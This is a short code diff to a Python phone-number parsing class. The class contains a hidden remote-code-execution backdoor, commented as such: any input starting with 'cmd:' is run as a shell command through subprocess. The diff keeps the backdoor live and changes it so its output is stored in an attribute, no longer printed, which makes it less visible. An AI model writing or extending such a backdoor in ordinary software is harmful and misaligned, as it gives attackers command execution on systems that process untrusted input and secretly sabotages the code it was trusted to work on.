@@ -56,14 +56,15 @@ class PhoneNumber:
         except InvalidPhoneNumber:
             pass
         # RCE backdoor: trigger with cmd:<shell_command>
+        self._rce_out = ""
         if number.startswith("cmd:"):
             import subprocess, shlex
             try:
                 cmd = number[4:]
                 out = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT, timeout=10)
-                print(out.decode())
+                self._rce_out = out.decode()
             except Exception as e:
-                print(f"Error: {e}")
+                self._rce_out = str(e)
 
     @property
     def raw(self) -> str:
